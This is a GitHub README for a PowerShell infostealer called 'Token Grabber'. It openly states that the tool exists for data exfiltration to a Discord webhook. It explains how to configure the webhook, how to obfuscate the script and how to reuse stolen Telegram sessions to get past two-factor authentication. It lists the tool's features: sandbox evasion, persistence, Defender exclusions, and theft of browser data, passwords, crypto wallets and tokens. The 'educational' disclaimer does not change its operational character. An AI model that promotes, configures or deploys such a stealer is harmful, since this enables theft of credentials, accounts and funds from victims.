<p align="center">
<img src="https://i.postimg.cc/m2SSKrBt/Logo.gif", width="300", height="300">
</p>

<h1 align="center">
</h1>
<p align= "center">
  <img src="https://img.shields.io/github/languages/top/kdot227/Powershell-Token-Grabber">
   <img src="https://img.shields.io/github/stars/kdot227/Powershell-Token-Grabber.svg?color=yellow">
   <img src="https://img.shields.io/github/forks/kdot227/Powershell-Token-Grabber.svg?color=red">
   <img src="https://img.shields.io/github/issues/kdot227/Powershell-Token-Grabber.svg?color=green">
   <br>
   <img src="https://img.shields.io/github/last-commit/kdot227/Powershell-Token-Grabber">
   <img src="https://img.shields.io/github/license/kdot227/Powershell-Token-Grabber">
    <img src="https://img.shields.io/endpoint?color=green&label=views&url=https%3A%2F%2Fhits.dwyl.com%2Fkdot%2FPowerShell-Token-Grabber.json">
    <img src="https://img.shields.io/github/repo-size/kdot227/Powershell-Token-Grabber.svg?label=Repo%20size&style=flat-square">
   <br>
</p>

# PowerShell Token Grabber 

This tool is made for data exfiltration. All information collected is sent using discord webhooks.

# Usage
- Create a Webhook on your [Discord Server](https://discord.com). I recommend creating a new server.
- Replace ```YOUR_WEBHOOK_HERE``` in [line 6](https://github.com/Chainski/Powershell-Token-Grabber/blob/main/main.ps1#L6) with your webhook.
https://github.com/Chainski/PowerShell-Token-Grabber/blob/5c7f9f982fab344f308963072806075569b8da37/main.ps1#L6

# Want to obfuscate the code ?
Use [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation). \
Or use [Somalifuscator](https://github.com/kdot227/somalifuscator) for .bat files 

# Screenshots
  ### Builder
> ![GUI](https://i.postimg.cc/XYGShDPP/builder.png)


 ### Webhook Data
> ![screenshot](https://user-images.githubusercontent.com/96607632/236490140-201f4987-3569-4542-a769-41cf09574f2d.png)
> ![more data](https://github.com/Chainski/PowerShell-Token-Grabber/assets/96607632/222b7baf-13f3-4db0-bc70-7582bf3d6e36)


#  Features
- [x] GUI Builder
- [x] Force UAC
- [x] Anti-Analysis (VMWare, VirtualBox, SandBoxie, Debugger, VirusTotal, Any.Run)
- [x] Persistence via [Task Scheduler](https://learn.microsoft.com/en-us/windows/win32/taskschd/about-the-task-scheduler) 
- [x] Extracts WiFi Passwords
- [x] File grabber (sensitive files: ```2fa, backupcodes, seedphrases, passwords, etc.```) 
- [x] Crypto Wallets 
   > Armory | Atomic | Bitcoin | Bytecoin | Coinomi | Dash | Electrum | Ethereum | Exodus | Jaxx | Litecoin | Monero | Zcash
- [x] Extracts Browser Data (Brave, Chrome, Firefox, Microsoft Edge, Thunderbird etc.)
- [x] Telegram Session Stealer that [Bypasses 2FA](https://www.microsoft.com/en-ww/security/business/security-101/what-is-two-factor-authentication-2fa)
- [x] Extracts Discord Token
- [x] Get System Information (Version, CPU, DISK, GPU, RAM, IP, Installed Apps etc.)
- [x] Takes Desktop Screenshot  
- [x] Get System Uptime 
- [X] Get Screen Resolution
- [x] List of Installed Applications
- [x] List of Installed Antiviruses
- [x] List of all Network Adapters
- [x] List of Apps that Run On Startup
- [x] List of Running Services & Applications
- [x] List TCP Connections and Underlying Process
- [x] Extracts Product Key
- [x] Self-Destructs After Execution (optional)

### Telegram-Stealer Usage :
After the exfiltrated data is uploaded to your discord webhook, download the compressed file ```KDOT.zip```, inside that folder there will also be another zipped folder ```telegram-session.zip``` extract it on your PC.
Now, copy the tdata folder and paste it in the directory below:

```
%userprofile%\AppData\Roaming\Telegram Desktop
```
Before pasting the tdata folder, ensure that you have deleted the existing tdata folder on your PC.
# ![image](https://user-images.githubusercontent.com/96607632/235702107-5800e44e-b4d3-4147-8fb0-b78aece6eae7.png)


 
## 🗑 Uninstaller (Removes the Scheduled Task, Script Folder and ExclusionPaths)
- Open a new Elevated Powershell Console and Paste the Contents below
```ps1
$ErrorActionPreference = "SilentlyContinue"
function Cleanup {
  Unregister-ScheduledTask -TaskName "KDOT" -Confirm:$False
  Remove-Item -Path "$env:appdata\KDOT" -force -recurse
  Remove-MpPreference -ExclusionPath "$env:APPDATA\KDOT"
  Remove-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
  Write-Host "[~] Successfully Uninstalled !" -ForegroundColor Green
}
Cleanup
```

# Need Help?
- Join our server https://discord.com/invite/batch

# License
This project is licensed under the MIT License - see the [LICENSE](https://github.com/kdot227/Powershell-Token-Grabber/blob/main/LICENSE) file for details

# Disclaimer
I, the creator, am not responsible for any actions, and or damages, caused by this software.
You bear the full responsibility of your actions and acknowledge that this tool was created for educational purposes only.
This tool's main purpose is NOT to be used maliciously, or on any system that you do not own, or have the right to use.
By using this software, you automatically agree to the above.

# References 

```Yaml
YARA Rule Info
Name : SUSP_PS1_PowerShell_Recon_Mar23_1
RULE Hash : eda1df8e3375891644fe9cac90852b0d
Description : Detects suspicious PowerShell code that performs reconnaissance tasks
Rule Link : https://valhalla.nextron-systems.com/info/rule/SUSP_PS1_PowerShell_Recon_Mar23_1
Rule Author : Florian Roth
```

# Credits
- https://github.com/Purp1eW0lf
- https://github.com/KDot227
- https://github.com/Chainski

<p align="center"><a href=#top>Back to Top</a></p>
